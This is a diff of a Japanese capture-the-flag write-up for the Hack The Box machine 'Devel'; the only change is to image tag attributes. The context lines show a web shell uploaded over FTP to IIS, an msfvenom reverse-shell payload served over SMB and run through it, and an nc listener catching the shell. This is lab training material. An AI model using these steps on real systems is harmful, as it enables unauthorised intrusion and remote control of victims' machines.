@@ -44,7 +44,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds
 
 ## STEP 2
 80番にアクセスすると、iisだった  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_01.png" width="50%" height="50%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_01.png">  
 nmapの結果から、ftpでリストされているフォルダはiisのフォルダだとわかる  
 ftpでiis用のWebSehllをアップロードできそう  
 `seclists`のwebshellをftpでiis上にアップロード
@@ -57,7 +57,7 @@ ftpでiis用のWebSehllをアップロードできそう
 100  1400    0     0  100  1400      0    461  0:00:03  0:00:03 --:--:--   461
 ```
 webshellアップロード成功、コマンド実行も確認  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_02.png" width="100%" height="100%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_02.png">  
 kaliでペイロードを作成し、smbサーバにアップロード
 ```sh
 └─$ msfvenom -p windows/shell_reverse_tcp  LHOST=tun0 LPORT=4444 -f exe -o shell.exe
@@ -78,7 +78,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 ```
 webshellからsmbサーバのペイロードを実行
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_03.png" width="100%" height="100%">
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Devel_03.png">
 リバースシェル取得！
 ```sh
 └─$ rlwrap nc -lnvp 4444
